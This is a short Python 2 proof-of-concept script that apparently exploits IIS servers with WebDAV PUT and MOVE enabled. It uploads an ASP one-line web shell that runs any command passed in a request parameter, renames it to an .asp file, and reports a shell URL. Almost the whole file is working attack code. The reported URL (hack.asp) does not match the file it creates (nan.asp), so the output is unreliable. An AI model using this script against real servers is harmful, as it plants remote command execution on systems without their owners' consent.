#-*- encoding:utf-8 -*-
# iisPUT.py www.example.com:8080

import httplib

import sys


#main url
def poc(url):
	try:
	    conn = httplib.HTTPConnection(url)
	    conn.request(method='OPTIONS', url='/')
	    headers = dict(conn.getresponse().getheaders())
	    if headers.get('server', '').find('Microsoft-IIS') < 0:
	        return 'This is not an IIS web server'

	    if 'public' in headers and \
	       headers['public'].find('PUT') > 0 and \
	       headers['public'].find('MOVE') > 0:
	       conn.close()
	       conn = httplib.HTTPConnection(url)

	       conn.request(method='PUT', url='/nan.txt', body='<%execute(request("cmd"))%>' )
	       conn.close()
	       conn = httplib.HTTPConnection(url)
	       # mv hack.txt to hack.asp
	       conn.request(method='MOVE', url='/nan.txt', headers={'Destination': '/nan.asp'})
	       return 'ASP webshell:', 'http://' + url + '/hack.asp'
	    else:
	       return 'Server not vulnerable'

	except Exception,e:
		return False
	